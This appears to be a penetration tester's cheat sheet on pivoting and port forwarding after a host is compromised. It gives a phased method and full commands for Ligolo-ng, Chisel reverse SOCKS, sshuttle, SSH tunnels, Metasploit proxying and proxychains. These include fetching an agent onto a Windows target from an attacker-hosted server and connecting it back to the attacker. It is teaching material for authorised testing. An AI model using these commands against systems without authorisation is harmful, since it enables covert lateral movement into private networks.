# Pivoting and Port Forwarding

### When to use this
You found internal subnets or need to reach a non-routable host. Use pivoting when a compromised machine has access to a network your attack box cannot reach directly.

---

# Pivoting and Port Forwarding Methodology

This section outlines a structured approach to identifying pivot points, setting up tunnels, and effectively navigating internal networks during a penetration test. It transforms the various tool-specific commands below into an actionable strategy.

## Phase 1: Identify Pivot Points

1.  **Compromised Host Enumeration:**
    *   **Network Interfaces:** `ipconfig /all` (Windows), `ip a` (Linux). Identify all connected networks/subnets.
    *   **Routing Table:** `route print` (Windows), `ip r` (Linux). Understand how the compromised host routes traffic.
    *   **ARP Cache/Neighbor Discovery:** `arp -a` (Windows), `ip n` (Linux). Discover directly connected hosts.
    *   **Firewall Rules:** Identify what traffic is allowed in/out of the compromised host.
2.  **Target Assessment:**
    *   What are you trying to reach *from* the compromised host? (e.g., another subnet, a specific machine, a database server).
    *   What services are running on the compromised host that could be leveraged (e.g., SSH, RDP, web server)?

## Phase 2: Choose Your Tunneling Method

The choice of tunneling method depends on the compromised host's capabilities, your goals, and the environment's restrictions.

1.  **Local Port Forwarding (Client-Side):**
    *   **Goal:** Access a service on a remote network (via the compromised host) as if it were running on your local machine.
    *   **Use Case:** You can directly connect to the compromised host (e.g., via SSH or a reverse shell with listener) and want to reach an internal service *behind* it.
    *   **Example:** `ssh -L 8080:192.168.1.100:80 user@pivot_host` (Attacker's port 8080 maps to internal IP's port 80).
2.  **Remote Port Forwarding (Server-Side):**
    *   **Goal:** Expose a service from the compromised host (or a host *behind* it) to your attacking machine.
    *   **Use Case:** The compromised host can initiate an outbound connection to your machine, and you want to access a service on the internal network *from your attacking machine*.
    *   **Example:** `ssh -R 8080:192.168.1.100:80 user@attacker_host` (Attacker's port 8080 maps to internal IP's port 80, initiated from pivot_host).
3.  **Dynamic Port Forwarding (SOCKS Proxy):**
    *   **Goal:** Create a SOCKS proxy through the compromised host, allowing your attacking machine to route *any* traffic through the pivot.
    *   **Use Case:** Most flexible. Allows you to run scanners (Nmap), web browsers (Burp Suite), or other tools through the pivot. Ideal for exploring new subnets.
    *   **Tools:** `SSH -D`, Chisel, Ligolo-ng.
4.  **VPN-like Tunnels:**
    *   **Goal:** Establish a full Layer 3 network tunnel, making it seem like your attacking machine is directly on the internal network.
    *   **Use Case:** When you need full network access, transparent routing, and want to use all your tools without proxychains configuration. Often requires more setup on the compromised host.
    *   **Tools:** Ligolo-ng, Shuttle (via SSH).

## Phase 3: Select Your Tool(s)

Based on your chosen method and the compromised host's environment:

*   **SSH:** Available on most Linux/Unix-like systems, sometimes Windows (OpenSSH). Versatile for local, remote, and dynamic forwarding.
*   **Chisel:** A fast TCP/UDP tunnel, written in Go. Excellent for SOCKS proxies or port forwarding when SSH isn't available or easy to use. Requires transferring a binary.
*   **Ligolo-ng:** A powerful L3 VPN-like tunnel. Requires an agent on the compromised host and a proxy on your machine. Ideal for full network access.
*   **Shuttle (SSHuttle):** Python tool to transparently proxy connections over SSH, creating a VPN-like experience. Requires Python on the attacking machine.
*   **Metasploit (`portfwd`, `socks_proxy`):** If you have a Meterpreter session, these built-in capabilities are very convenient.

## Phase 4: Setup the Tunnel

1.  **Transfer Binaries (if needed):** For Chisel or Ligolo-ng, you'll need to get the agent/client binary onto the compromised host.
2.  **Start Listener (Attacker):** For tools like Chisel (server mode), Ligolo-ng (proxy), or Metasploit's SOCKS proxy, start the listener on your attacking machine first.
3.  **Execute Client (Compromised Host):** Run the corresponding client/agent on the compromised host, connecting back to your listener.
4.  **Configure Routes (Ligolo-ng, Shuttle):** For L3 tunnels, you might need to add routes on your attacking machine to direct traffic for the internal subnet through the tunnel interface.
5.  **Configure Proxychains (SOCKS Proxy):** If using a SOCKS proxy (e.g., `SSH -D`, Chisel, Metasploit socks_proxy), configure `/etc/proxychains4.conf` to point to your SOCKS server.

## Phase 5: Test the Pivot

1.  **Connectivity Check:**
    *   **Ping:** Try pinging an IP on the internal network (if L3 tunnel).
    *   **`proxychains nmap`:** Use Nmap with proxychains to scan a few internal IPs/ports (if SOCKS proxy).
    *   **`curl`:** Test HTTP connectivity to an internal web server.
2.  **Tool Integration:** Ensure your other tools (Burp Suite, `smbclient`, `crackmapexec`, etc.) can successfully use the pivot.

## Phase 6: Clean Up

*   Always remove any agents, binaries, or persistent changes made on the compromised host.
*   Delete routes or tunnel interfaces created on your attacking machine.

---
# Ligolo-ng

## Prerequisites

Download the agent for [Windows](https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_agent_0.5.1_windows_amd64.zip) (target machine is a Windows client):

Download the [proxy file for Linux](https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz) which will be run on the attacking machine:

```bash
┌──(kali㉿kali)-[~]
└─$ wget <https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz>

┌──(kali㉿kali)-[~]
└─$ wget <https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_agent_0.5.1_windows_amd64.zip>

┌──(kali㉿kali)-[~]
└─$ unzip ligolo-ng_agent_0.5.1_windows_amd64.zip

┌──(kali㉿kali)-[~]
└─$ tar -xf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz

```

Unzip the archives and host the files via python’s `http.server` module.

```bash
wget <https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz>
wget <https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_agent_0.5.1_windows_amd64.zip>
unzip ligolo-ng_agent_0.5.1_windows_amd64.zip
tar -xf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz

```

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (<http://0.0.0.0:8000/>) ...

```

## Transfer agent.exe to the Target

Transfer `agent.exe` to the target Windows machine (dual-homed host):

```powershell
PS C:\\\\Users\\\\Administrator\\\\Desktop> iwr <http://192.168.45.205:8000/agent.exe> -o agent.exe

```

## Set up a Ligolo Interface

On the attacking machine (e.g. Kali) create a tun interface called `ligolo`:

```bash
$ sudo ip tuntap add user kali mode tun ligolo
$ sudo ip link set ligolo up

```

## Run the Proxy with the Selfsign Option

On Kali, run the `proxy`:

```bash
./proxy -selfcert -laddr 0.0.0.0:443

```

## Connect to the Proxy via the Compromised Host

On target (Windows or Linux), run the `agent` or `agent.exe`:

```powershell
.\\\\agent -connect 192.168.45.236:443 -ignore-cert

```

Note: The IP used here points to our attacking machine (here: Kali VM).

We should get a notification on the `proxy` that the client has established a connection.

Select the session:

```powershell
ligolo-ng » session
```

Show the interfaces (on the attacker host):

```powershell
ligolo-ng » ifconfig
ligolo-ng » start
```

```bash
[Agent : CASTLE\\\\user@CLIENT01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:9e:e6:b8              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.75.243/24               │
└──────────────┴────────────────────────────────

```

## Create the Required Routes to the Internal Network

On Linux:

```bash
sudo ip route add 172.16.75.0/24 dev ligolo

```

On Windows:

```powershell
netsh int ipv4 show interfaces

route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]

```

###` Establish the tunnel

Start the tunnel on the proxy:

```bash
[Agent : BEYOND\\\\marcus@CLIENTWK1] » tunnel_start

```

Note: You can specify a custom tuntap via `--tun iface`

We can now access `172.16.75.0/24` agent network from the proxy server. Check if it works by pinging the internal targets.

## Clean Up

Check which routes exist on the machine:

```bash
$ ip route
172.16.235.0/24 dev ligolo scope link linkdown

```

Then, delete the existing route:

```bash
$ sudo ip route del 172.16.235.0/24 dev ligolo scope link

```

To delete the `ligolo` tun interface:

```bash
┌──(kali㉿kali)-[~/oscp/relia]
└─$ sudo ip link del ligolo

```

If you need more information check our the documentation.

# Chisel

## Install

```bash
# Clone Repository
git clone 'https://github.com/jpillora/chisel.git'

# Build Binary
go build

# Binary is now built and ready to be transfered over to target system.
```

## Reverse SOCKS Proxy

```bash
# Attacking Machine
./chisel server -p <Port> --reverse &
./chisel server -p 1337 --reverse &

# On Target Machine
./chisel client <Attacking-IP>:<Port> R:socks &
./chisel client 10.50.46.8:1337 R:socks &

# Then use Proxychains to scan internal networks from the compromised host.
```

# Shuttle

```bash
# Authenticate with password
sshuttle -r <User>@<Target-IP> <Target-Subnet> -x <Target-IP>
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5

# Authenticate with key.
sshuttle -r <User>@<IP> --ssh-cmd "<Command>" <Target Subnet> -x <Exclude IP>
sshuttle -r root@10.200.48.200 --ssh-cmd "ssh -i id_rsa" 10.200.48.0/24 -x 10.200.48.200
```

# SSH

```bash
# Forward RDP from internal host to Attacking Machine on port 1337.
ssh -L <LocalHost>:<Port>:<IP-To-Forward-From>:<Port> <User>@<IP>
ssh -L 127.0.0.1:1337:10.200.48.150:3389 root@10.200.48.200 -i id_rsa

# Forward remote port 80 to local port 80.
ssh atena@10.10.72.69 -L 80:127.0.0.1:80
ssh <User>@<IP> -L <Local-Port>127.0.0.1<Remote-Port>

# Dynamic SSH Port Forwarding
ssh -i <id_rsa> <User>@<IP> -D <Proxychains-Port>
ssh -i id_rsa errorcauser@10.10.254.201 -D 1080
```

# Metasploit with Proxychains

Change last line in `/etc/proxychains4.conf` to the following value: `socks5 127.0.0.1 1080`

Then use the following Metasploit module:

```bash
use auxiliary/server/socks_proxy
```

Set module options to the following (Default):

```c
Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
```

We can then force applications to use proxychains by initiating commands with the command `proxychains` first.

```bash
proxychains nmap <IP> -sT -p 1-10000 -sV -v
proxychains crackmapexec smb 10.10.10.100.5 -u '' -p ''
proxychains ssh <user>@<IP>
proxychains telnet <IP>
```

## Double Pivot

```bash
# /etc/proxychains.conf
# Ensure dynamic_chain is uncommented

dynamic_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
socks5  127.0.0.1 1080  # First Pivot
socks5  127.0.0.1 1081  # Second Pivot
```

# Port Forward

Meterpreter can be used to portforward for access to file shares and web servers.

```bash
portfwd add -l <LocalPort> -p <RemotePort> -r <TargetIP>
portfwd add -l 3333 -p 3389 -r 10.10.10.5
```

Essentially as per the example command above we could connect to RDP on our local port in order to hit the remote port.

```bash
rdesktop 127.0.0.1:3333
```

# xFreeRDP

Whilst not a direct pivoting technique, using `xFreeRDP` to share the hosts file system can give the attacker an easy route for moving files across systems to further assist with pivoting

```bash
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

![](<../.gitbook/assets/image (1861).png>)

# Tools

Chisel: [https://github.com/jpillora/chisel/releases/tag/v1.7.6](https://github.com/jpillora/chisel/releases/tag/v1.7.6)

# References

{% embed url="https://pentest.blog/explore-hidden-networks-with-double-pivoting/" %}